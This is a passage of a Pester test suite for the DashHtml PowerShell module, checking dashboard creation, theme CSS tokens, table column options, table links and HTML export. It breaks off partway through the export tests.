#Requires -Version 7.0
<#
.SYNOPSIS  Pester 5 test suite for the DashHtml module.
.DESCRIPTION
    Covers all public functions:
      New-DhDashboard, Add-DhTable, Set-DhTableLink, Export-DhDashboard,
      Get-DhTheme, Add-DhSummary, Add-DhHtmlBlock,
      Add-DhCollapsible, Add-DhFilterCard, Add-DhBarChart,
      Add-DhAlertBanner, Add-DhPieChart, Add-DhBullet,
      Add-DhLineChart, Add-DhEventFeed, Add-DhStatusGrid,
      Add-DhTabs, Add-DhHeatmap, Add-DhTopologyMap

    Run:  Invoke-Pester ./Tests -Output Detailed
          ./Build.ps1   (runs automatically as part of the build)
#>

# ---------------------------------------------------------------------------
# Module import
# ---------------------------------------------------------------------------
BeforeAll {
    $modulePath = Join-Path $PSScriptRoot '../DashHtml/DashHtml.psd1'
    Import-Module $modulePath -Force
}

AfterAll {
    Remove-Module DashHtml -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
# New-DhDashboard
# ---------------------------------------------------------------------------
Describe 'New-DhDashboard' {

    It 'Returns an OrderedDictionary with all required keys' {
        $r = New-DhDashboard -Title 'Test'
        # New-DhDashboard returns [ordered]@{} which is OrderedDictionary, not plain [hashtable]
        $r             | Should -BeOfType [System.Collections.Specialized.OrderedDictionary]
        $r.Title       | Should -Be 'Test'
        # Tables and Links are empty Lists at construction - piping an empty collection
        # through | unrolls to nothing, so compare directly to avoid the pipeline trap
        ($null -ne $r.Tables)        | Should -Be $true
        ($null -ne $r.Links)         | Should -Be $true
        $r.ThemeFamily | Should -Not -BeNullOrEmpty
        $r.Theme       | Should -Not -BeNullOrEmpty   # internal light CSS name
        $r.AlternateTheme | Should -Not -BeNullOrEmpty # internal dark CSS name (always set)
        $r.CssFileName | Should -Be ''                 # always empty — CSS embedded
        $r.GeneratedAt | Should -Not -BeNullOrEmpty
    }

    It 'Sets Subtitle correctly' {
        $r = New-DhDashboard -Title 'T' -Subtitle 'Sub'
        $r.Subtitle | Should -Be 'Sub'
    }

    It 'Warns when logo file does not exist' {
        { New-DhDashboard -Title 'T' -LogoPath 'C:\nonexistent_logo_xyz.jpg' -WarningAction Stop } |
            Should -Throw
    }

    It 'Embeds logo when JPG file exists' {
        $tmp = [IO.Path]::GetTempFileName() + '.jpg'
        [IO.File]::WriteAllBytes($tmp, [byte[]]@(0xFF, 0xD8, 0xFF, 0xD9))
        $r = New-DhDashboard -Title 'T' -LogoPath $tmp
        $r.LogoBase64 | Should -Not -BeNullOrEmpty
        Remove-Item $tmp -Force
    }

    It 'Defaults to Default theme family' {
        $r = New-DhDashboard -Title 'T'
        $r.ThemeFamily | Should -Be 'Default'
    }

    It 'Default family maps to DefaultLight (primary) and DefaultDark (alternate)' {
        $r = New-DhDashboard -Title 'T' -Theme Default
        $r.Theme          | Should -Be 'DefaultLight'
        $r.AlternateTheme | Should -Be 'DefaultDark'
    }

    It 'Azure family maps to AzureLight and AzureDark' {
        $r = New-DhDashboard -Title 'T' -Theme Azure
        $r.Theme          | Should -Be 'AzureLight'
        $r.AlternateTheme | Should -Be 'AzureDark'
    }

    It 'VMware family maps to VMwareLight and VMwareDark' {
        $r = New-DhDashboard -Title 'T' -Theme VMware
        $r.Theme          | Should -Be 'VMwareLight'
        $r.AlternateTheme | Should -Be 'VMwareDark'
    }

    It 'Grey family maps to GreyLight and GreyDark' {
        $r = New-DhDashboard -Title 'T' -Theme Grey
        $r.Theme          | Should -Be 'GreyLight'
        $r.AlternateTheme | Should -Be 'GreyDark'
    }

    It 'Company family maps to CompanyLight and CompanyDark' {
        $r = New-DhDashboard -Title 'T' -Theme Company
        $r.Theme          | Should -Be 'CompanyLight'
        $r.AlternateTheme | Should -Be 'CompanyDark'
    }

    It 'CssFileName is always empty string (CSS embedded in HTML)' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company')) {
            $r = New-DhDashboard -Title 'T' -Theme $family
            $r.CssFileName | Should -Be '' -Because "theme family '$family' must not produce an external CSS file"
        }
    }

    It 'NavTitle defaults to empty string when not set' {
        $r = New-DhDashboard -Title 'My Report'
        $r.NavTitle | Should -Be ''
    }

    It 'NavTitle stores custom short label' {
        $r = New-DhDashboard -Title 'Azure Infrastructure Report' -NavTitle 'Azure Infra'
        $r.NavTitle | Should -Be 'Azure Infra'
    }

    It 'NavTitle empty string suppresses nav label' {
        $r = New-DhDashboard -Title 'My Report' -NavTitle ''
        $r.NavTitle | Should -Be ''
    }

    # ---- v1.4.2 — -AutoRefresh ----------------------------------------------
    It 'AutoRefresh defaults to 0 (disabled) when not set' {
        $r = New-DhDashboard -Title 'R'
        $r.AutoRefreshSec | Should -Be 0
    }

    It 'AutoRefresh accepts plain integer seconds' {
        $r = New-DhDashboard -Title 'R' -AutoRefresh '30'
        $r.AutoRefreshSec | Should -Be 30
    }

    It 'AutoRefresh accepts the s / m / h units' {
        (New-DhDashboard -Title 'R' -AutoRefresh '45s').AutoRefreshSec | Should -Be 45
        (New-DhDashboard -Title 'R' -AutoRefresh '5m').AutoRefreshSec  | Should -Be 300
        (New-DhDashboard -Title 'R' -AutoRefresh '1h').AutoRefreshSec  | Should -Be 3600
    }

    It 'AutoRefresh throws on garbage input' {
        { New-DhDashboard -Title 'R' -AutoRefresh '5 minutes' } | Should -Throw
        { New-DhDashboard -Title 'R' -AutoRefresh 'abc' }       | Should -Throw
    }

    It 'AutoRefresh emits a meta http-equiv refresh tag in HTML' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AR_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $r = New-DhDashboard -Title 'R' -AutoRefresh '300'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-ar.html'
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '<meta http-equiv="refresh" content="300">'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'AutoRefresh omits the meta tag when not set' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_AR_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $r = New-DhDashboard -Title 'R'
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-noar.html'
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Not -Match 'http-equiv="refresh"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Add-DhTable
# ---------------------------------------------------------------------------
Describe 'Add-DhTable' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $script:data   = @(
            [PSCustomObject]@{ Name = 'Alpha'; Value = 1 }
            [PSCustomObject]@{ Name = 'Beta';  Value = 2 }
        )
    }

    It 'Adds a table to the report' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'Table 1' -Data $data
        $report.Tables.Count    | Should -Be 1
        $report.Tables[0].Id    | Should -Be 'tbl1'
        $report.Tables[0].Title | Should -Be 'Table 1'
    }

    It 'Auto-detects columns from PSObject' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data
        $cols = $report.Tables[0].Columns
        ($cols | Where-Object { $_.Field -eq 'Name' })  | Should -Not -BeNullOrEmpty
        ($cols | Where-Object { $_.Field -eq 'Value' }) | Should -Not -BeNullOrEmpty
    }

    It 'Auto-detects columns from hashtable data' {
        $hashData = @(@{ City = 'Rome'; Pop = 3000000 })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $hashData
        ($report.Tables[0].Columns | Where-Object { $_.Field -eq 'City' }) | Should -Not -BeNullOrEmpty
    }

    It 'Respects custom column Label' {
        $cols = @(@{ Field = 'Name'; Label = 'Item Name'; Width = '200px' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Label | Should -Be 'Item Name'
    }

    It 'Normalises data rows to OrderedDictionary' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data
        $report.Tables[0].Data[0] | Should -BeOfType [System.Collections.Specialized.OrderedDictionary]
    }

    It 'Applies Thresholds array to column definition' {
        $thresholds = @(
            @{ Max = 70; Class = 'cell-ok'   }
            @{           Class = 'cell-danger' }
        )
        $cols = @(@{ Field = 'Value'; Label = 'V'; Thresholds = $thresholds })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Thresholds.Count | Should -Be 2
        $col.Thresholds[0].Class | Should -Be 'cell-ok'
    }

    It 'Stores CellType on column definition' {
        $cols = @(@{ Field = 'Value'; Label = 'V'; CellType = 'progressbar'; ProgressMax = 200 })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.CellType    | Should -Be 'progressbar'
        $col.ProgressMax | Should -Be 200
    }

    It 'Stores Bold and Italic flags on column' {
        $cols = @(@{ Field = 'Name'; Label = 'N'; Bold = $true; Italic = $true })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Bold   | Should -Be $true
        $col.Italic | Should -Be $true
    }

    It 'Stores Font override on column' {
        $cols = @(@{ Field = 'Name'; Label = 'N'; Font = 'mono' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Font | Should -Be 'mono'
    }

    It 'Stores Charts array on table definition' {
        $charts = @(@{ Title = 'Status'; Field = 'Name'; Type = 'pie' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -Charts $charts
        $report.Tables[0].Charts.Count      | Should -Be 1
        $report.Tables[0].Charts[0].Field   | Should -Be 'Name'
        $report.Tables[0].Charts[0].Type    | Should -Be 'pie'
    }

    It 'Throws on duplicate TableId' {
        Add-DhTable -Report $report -TableId 'dup' -Title 'T1' -Data $data
        { Add-DhTable -Report $report -TableId 'dup' -Title 'T2' -Data $data } |
            Should -Throw
    }

    It 'Throws on invalid TableId characters (spaces)' {
        { Add-DhTable -Report $report -TableId 'bad id!' -Title 'T' -Data $data } |
            Should -Throw
    }

    It 'Accepts MultiSelect flag' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -MultiSelect
        $report.Tables[0].MultiSelect.IsPresent | Should -Be $true
    }

    It 'Stores ExportFileName in table definition' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data `
            -ExportFileName 'my-export'
        $report.Tables[0].ExportFileName | Should -Be 'my-export'
    }

    It 'ExportFileName defaults to empty string when not set' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data
        $report.Tables[0].ExportFileName | Should -Be ''
    }

    It 'Aggregate property is stored on column definition' {
        $cols = @(@{ Field='Value'; Label='V'; Aggregate='sum' })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].Aggregate | Should -Be 'sum'
    }

    It 'PinFirst property is stored on column definition' {
        $cols = @(@{ Field='Name'; Label='N'; PinFirst=$true })
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T' -Data $data -Columns $cols
        $report.Tables[0].Columns[0].PinFirst | Should -Be $true
    }

    It 'Stores PageSize correctly' {
        Add-DhTable -Report $report -TableId 'tbl1' -Title 'T1' -Data $data -PageSize 25
        $report.Tables[0].PageSize | Should -Be 25
    }

    # ---- Sparkline cell type (v1.4 F8) ---------------------------------------
    It 'CellType accepts sparkline; SortBy + SparklineStyle default sensibly' {
        $cols = @(@{ Field='Cpu24h'; Label='CPU 24h'; CellType='sparkline' })
        Add-DhTable -Report $report -TableId 'tbl-spark' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.CellType       | Should -Be 'sparkline'
        $col.SortBy         | Should -Be 'last'
        $col.SparklineStyle | Should -Be 'line'
    }

    It 'CellType validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='heatmap' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-ct' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SortBy validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SortBy='median' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-sb' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SparklineStyle validation rejects unknown values' {
        $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SparklineStyle='wave' })
        { Add-DhTable -Report $report -TableId 'tbl-bad-sps' -Title 'T' -Data $data -Columns $cols } | Should -Throw
    }

    It 'SortBy accepts all five reduction modes' {
        foreach ($mode in 'last','avg','max','min','sum') {
            $r = New-DhDashboard -Title 'T'
            $cols = @(@{ Field='X'; Label='X'; CellType='sparkline'; SortBy=$mode })
            Add-DhTable -Report $r -TableId 'tbl' -Title 'T' -Data $data -Columns $cols
            $r.Tables[0].Columns[0].SortBy | Should -Be $mode
        }
    }

    It 'HTML emits array row values as JSON arrays (sparkline column)' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SparkCell_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $rows = @(
                [PSCustomObject]@{ Host='srv-01'; Cpu24h=@(30,42,38,55,67,71,68,52) }
                [PSCustomObject]@{ Host='srv-02'; Cpu24h=@(10,12,15,11,13,9,8,7) }
            )
            $cols = @(
                @{ Field='Host';   Label='Host' }
                @{ Field='Cpu24h'; Label='CPU 24h'; CellType='sparkline'; SortBy='max'; SparklineStyle='area' }
            )
            Add-DhTable -Report $report -TableId 'srv' -Title 'Servers' -Data $rows -Columns $cols
            $htmlPath = Join-Path $tmpDir2 'test-spark-cell.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"cellType":"sparkline"'
            $content | Should -Match '"sortBy":"max"'
            $content | Should -Match '"sparklineStyle":"area"'
            # Array values preserved as JSON arrays (NOT stringified)
            $content | Should -Match '"Cpu24h":\[30,42,38,55,67,71,68,52\]'
            $content | Should -Match '"Cpu24h":\[10,12,15,11,13,9,8,7\]'
            # JS sparkline reducer + SPARK helper present
            $content | Should -Match 'function sparkReduce'
            $content | Should -Match "cellType\s*===\s*'sparkline'"
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Unified -Rag on columns (v1.4 F13) ----------------------------------
    It 'Column Rag converts to Thresholds + RagNoData' {
        $cols = @(
            @{ Field='Status'; Label='Status'
               Rag=@{
                   Green = @{ Max=70 }
                   Amber = @{ Min=70; Max=90 }
                   Red   = @{ Min=90 }
                   NoData = $true
               }
            }
        )
        Add-DhTable -Report $report -TableId 'tbl-rag' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        $col.Contains('Rag')          | Should -Be $false
        $col.RagNoData                | Should -Be $true
        @($col.Thresholds).Count      | Should -Be 3
        $col.Thresholds[0].Class      | Should -Be 'cell-ok'
        $col.Thresholds[2].Class      | Should -Be 'cell-danger'
    }

    It 'Column Rag wins over legacy Thresholds=' {
        $cols = @(
            @{ Field='Status'; Label='Status'
               Thresholds=@(@{ Value='Old'; Class='cell-warn' })  # should be discarded
               Rag=@{ Green=@{Max=50}; Red=@{Min=50} }
            }
        )
        Add-DhTable -Report $report -TableId 'tbl-rag-pref' -Title 'T' -Data $data -Columns $cols
        $col = $report.Tables[0].Columns[0]
        @($col.Thresholds).Count    | Should -Be 2   # the two Rag bands, not the legacy 'Old'
        $col.Thresholds[0].Class    | Should -Be 'cell-ok'
        $col.Thresholds[1].Class    | Should -Be 'cell-danger'
    }

    It 'Column Rag emits ragNoData flag in HTML' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_RagTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            $cols = @(
                @{ Field='Latency'; Label='Latency'
                   Rag=@{
                       Green=@{Max=50}; Amber=@{Min=50;Max=100}; Red=@{Min=100}; NoData=$true
                   }
                }
            )
            Add-DhTable -Report $report -TableId 'tbl-rag-html' -Title 'T' -Data $data -Columns $cols
            $htmlPath = Join-Path $tmpDir2 'test-col-rag.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"ragNoData":true'
            $content | Should -Match '"min":100,"class":"cell-danger"'
            $content | Should -Match '"max":50,"class":"cell-ok"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# Set-DhTableLink
# ---------------------------------------------------------------------------
Describe 'Set-DhTableLink' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
        $data = @([PSCustomObject]@{ Key = 'A'; Val = 1 })
        Add-DhTable -Report $report -TableId 'master' -Title 'Master' -Data $data
        Add-DhTable -Report $report -TableId 'detail' -Title 'Detail' -Data $data
    }

    It 'Adds exactly one link' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Key'
        $report.Links.Count | Should -Be 1
    }

    It 'Records correct table IDs' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Key'
        $report.Links[0].MasterTableId | Should -Be 'master'
        $report.Links[0].DetailTableId | Should -Be 'detail'
    }

    It 'Records correct field names' {
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail' `
                      -MasterField 'Key' -DetailField 'Val'
        $report.Links[0].MasterField | Should -Be 'Key'
        $report.Links[0].DetailField | Should -Be 'Val'
    }

    It 'Allows multiple links from same master' {
        $data2 = @([PSCustomObject]@{ Key = 'A' })
        Add-DhTable -Report $report -TableId 'detail2' -Title 'D2' -Data $data2
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail'  -MasterField 'Key' -DetailField 'Key'
        Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'detail2' -MasterField 'Key' -DetailField 'Key'
        $report.Links.Count | Should -Be 2
    }

    It 'Throws when master table does not exist' {
        { Set-DhTableLink -Report $report -MasterTableId 'noexist' -DetailTableId 'detail' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }

    It 'Throws when detail table does not exist' {
        { Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'noexist' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }

    It 'Throws when master and detail are the same table' {
        { Set-DhTableLink -Report $report -MasterTableId 'master' -DetailTableId 'master' `
                        -MasterField 'K' -DetailField 'K' } | Should -Throw
    }
}

# ---------------------------------------------------------------------------
# Get-DhTheme
# ---------------------------------------------------------------------------
Describe 'Get-DhTheme' {

    It 'Returns exactly six theme families when called without parameters' {
        $themes = Get-DhTheme
        $themes.Count | Should -Be 6
    }

    It 'Returned list includes all six family names' {
        $themes = Get-DhTheme
        ($themes | Where-Object Family -eq 'Default') | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Azure')   | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'VMware')  | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Grey')    | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Company') | Should -Not -BeNullOrEmpty
        ($themes | Where-Object Family -eq 'Rag')     | Should -Not -BeNullOrEmpty
    }

    It 'List entries expose LightTheme and DarkTheme internal names' {
        $themes = Get-DhTheme
        $default = $themes | Where-Object Family -eq 'Default'
        $default.LightTheme | Should -Be 'DefaultLight'
        $default.DarkTheme  | Should -Be 'DefaultDark'
    }

    It 'Returns PSCustomObject with LightCss and DarkCss for Default' {
        $result = Get-DhTheme -Name Default
        $result | Should -BeOfType [PSCustomObject]
        $result.LightCss | Should -BeOfType [string]
        $result.DarkCss  | Should -BeOfType [string]
        $result.LightCss.Length | Should -BeGreaterThan 1000
        $result.DarkCss.Length  | Should -BeGreaterThan 1000
    }

    It 'Default family LightCss has light background token' {
        $result = Get-DhTheme -Name Default
        $result.LightCss | Should -Match '#F0F4F8'
    }

    It 'Default family DarkCss has dark background token' {
        $result = Get-DhTheme -Name Default
        $result.DarkCss | Should -Match '#0b0f14'
    }

    It 'Company family has Montserrat and Crimson Glory in both variants' {
        $result = Get-DhTheme -Name Company
        $result.LightCss | Should -Match 'Montserrat'
        $result.LightCss | Should -Match '#BE0036'
        $result.DarkCss  | Should -Match 'Montserrat'
        $result.DarkCss  | Should -Match '#BE0036'
        $result.DarkCss  | Should -Match '#0E0709'
    }

    It 'All six families contain panel-mode CSS in both variants' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company','Rag')) {
            $result = Get-DhTheme -Name $family
            $result.LightCss | Should -Match 'panel-active' -Because "$family light must include panel CSS"
            $result.DarkCss  | Should -Match 'panel-active' -Because "$family dark must include panel CSS"
        }
    }

    It 'All six families contain cell threshold variables in both variants' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company','Rag')) {
            $result = Get-DhTheme -Name $family
            foreach ($css in @($result.LightCss, $result.DarkCss)) {
                $css | Should -Match '--cell-ok-fg'     -Because "$family must have cell-ok-fg"
                $css | Should -Match '--cell-warn-fg'   -Because "$family must have cell-warn-fg"
                $css | Should -Match '--cell-nodata-fg' -Because "$family must have cell-nodata-fg (v1.4)"
                $css | Should -Match '--nav-bg'         -Because "$family must have nav-bg"
                $css | Should -Match '--chart-1'        -Because "$family must have chart-1"
            }
        }
    }

    It 'Azure family has correct accent and font references' {
        $result = Get-DhTheme -Name Azure
        $result.LightCss | Should -Match '#0078D4'
        $result.LightCss | Should -Match 'Segoe UI'
        $result.DarkCss  | Should -Match '#479EF5'
    }

    It 'VMware family has VMware green and Inter font' {
        $result = Get-DhTheme -Name VMware
        $result.LightCss | Should -Match '#00B388'
        $result.LightCss | Should -Match 'Inter'
        $result.DarkCss  | Should -Match '#00C49A'
    }

    It 'Grey family has neutral grey accent in both variants' {
        $result = Get-DhTheme -Name Grey
        $result.LightCss | Should -Match '#546E7A'
        $result.DarkCss  | Should -Match '#78909C'
    }

    # ---- v1.4: Rag theme (spec §7.2 Office/Excel RAG palette) ----------------
    It 'Rag family uses the spec-exact RAG palette in the light variant' {
        $result = Get-DhTheme -Name Rag
        # Spec §7.2 GREEN
        $result.LightCss | Should -Match '#375623'
        $result.LightCss | Should -Match '#E2EFDA'
        # Spec §7.2 AMBER
        $result.LightCss | Should -Match '#7F4B00'
        $result.LightCss | Should -Match '#FFF2CC'
        # Spec §7.2 RED
        $result.LightCss | Should -Match '#9C0006'
        $result.LightCss | Should -Match '#FFDCE1'
        # Spec §7.2 GREY (no-data)
        $result.LightCss | Should -Match '#595959'
        $result.LightCss | Should -Match '#F2F2F2'
    }

    It 'Rag dark variant uses Office dark-mode RAG companions' {
        $result = Get-DhTheme -Name Rag
        $result.DarkCss | Should -Match '#A9D08E'   # green companion
        $result.DarkCss | Should -Match '#FFD966'   # amber companion
        $result.DarkCss | Should -Match '#FF7E7E'   # red companion
        $result.DarkCss | Should -Match '#A6A6A6'   # grey companion
    }

    It 'Rag theme is selectable via New-DhDashboard' {
        $report = New-DhDashboard -Title 'Rag test' -Theme Rag
        $report.Theme          | Should -Be 'RagLight'
        $report.AlternateTheme | Should -Be 'RagDark'
        $report.ThemeFamily    | Should -Be 'Rag'
    }

    It 'SaveTo writes two CSS files to the specified directory' {
        $tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('theme_test_' + [guid]::NewGuid().ToString('N'))
        Get-DhTheme -Name Default -SaveTo $tmpDir
        $lightFile = Join-Path $tmpDir 'Default-light.css'
        $darkFile  = Join-Path $tmpDir 'Default-dark.css'
        Test-Path $lightFile | Should -Be $true
        Test-Path $darkFile  | Should -Be $true
        (Get-Content $lightFile -Raw) | Should -Match '#F0F4F8'
        (Get-Content $darkFile  -Raw) | Should -Match '#0b0f14'
        Remove-Item $tmpDir -Recurse -Force
    }
}

# ---------------------------------------------------------------------------
# Export-DhDashboard
# ---------------------------------------------------------------------------
Describe 'Export-DhDashboard' {

    BeforeAll {
        $script:tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('DH_Test_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmpDir | Out-Null
    }

    AfterAll {
        if (Test-Path $script:tmpDir) { Remove-Item $script:tmpDir -Recurse -Force }
    }

    BeforeEach {
        $script:report = New-DhDashboard -Title 'Export Test' -Subtitle 'Unit test'
        $data = @(
            [PSCustomObject]@{ Host = 'esx01'; CPU = 45; Status = 'OK'   }
            [PSCustomObject]@{ Host = 'esx02'; CPU = 82; Status = 'Warn' }
        )
        Add-DhTable -Report $report -TableId 'hosts' -Title 'Hosts' -Data $data
    }

    It 'Creates the HTML file' {
        $htmlPath = Join-Path $tmpDir 'test-basic.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        Test-Path $htmlPath | Should -Be $true
    }

    It 'Embeds both CSS themes directly in the HTML (no external CSS file)' {
        $htmlPath = Join-Path $tmpDir 'test-css.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        # Both theme style blocks must be present
        $content | Should -Match 'id="theme-primary"'
        $content | Should -Match 'id="theme-alternate"'
        $content | Should -Match 'media="none"'
    }

    It 'HTML contains the section id for the table' {
        $htmlPath = Join-Path $tmpDir 'test-section.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'section-hosts'
    }

    It 'HTML contains TABLES_CONFIG with table id' {
        $htmlPath = Join-Path $tmpDir 'test-json.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'TABLES_CONFIG'
        $content | Should -Match '"id":"hosts"'
    }

    It 'HTML contains all three export buttons for the table' {
        $htmlPath = Join-Path $tmpDir 'test-export-btns.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'exp-csv-hosts'
        $content | Should -Match 'exp-xlsx-hosts'
        $content | Should -Match 'exp-pdf-hosts'
    }

    It 'HTML contains CDN script tags for XLSX and PDF' {
        $htmlPath = Join-Path $tmpDir 'test-cdn.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'xlsx.full.min.js'
        $content | Should -Match 'jspdf.umd.min.js'
        $content | Should -Match 'jspdf.plugin.autotable'
    }

    It 'HTML contains panel-mode JS (showPanel function)' {
        $htmlPath = Join-Path $tmpDir 'test-panels.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'showPanel'
    }

    It 'HTML contains nav bar markup' {
        # v2.0.0: the menu is RENDERED CLIENT-SIDE from the data-navpath
        # attributes on the sections, so the strips/chips do not appear in the
        # static HTML. What must be present statically is the nav chrome plus
        # the per-section nav data the runtime derives the whole menu from.
        $htmlPath = Join-Path $tmpDir 'test-nav.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'report-nav'
        $content | Should -Match 'id="nav-strips"'
        $content | Should -Match 'data-navpath='
        $content | Should -Match 'data-navscope='
        # the 'hosts' table must carry its own path node
        $content | Should -Match 'id="section-hosts"'
        $content | Should -Match 'hosts'
    }

    It 'HTML meta tag records the theme family' {
        $r2 = New-DhDashboard -Title 'T2' -Theme Company
        Add-DhTable -Report $r2 -TableId 'h2' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-meta-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'report-theme.*Company'
    }

    It 'Company theme embeds Montserrat CSS in the HTML' {
        $r2 = New-DhDashboard -Title 'T2' -Theme Company
        Add-DhTable -Report $r2 -TableId 'h2' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-company-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match 'Montserrat'
    }

    It 'Default theme embeds DefaultLight CSS (blue accent) in the HTML' {
        $r3 = New-DhDashboard -Title 'T3' -Theme Default
        Add-DhTable -Report $r3 -TableId 'h3' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-default-theme.html'
        Export-DhDashboard -Report $r3 -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '#F0F4F8'
    }

    It 'Azure theme embeds Segoe UI and Azure blue in the HTML' {
        $r4 = New-DhDashboard -Title 'T4' -Theme Azure
        Add-DhTable -Report $r4 -TableId 'h4' -Title 'H' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-azure-theme.html'
        Export-DhDashboard -Report $r4 -OutputPath $htmlPath -Force
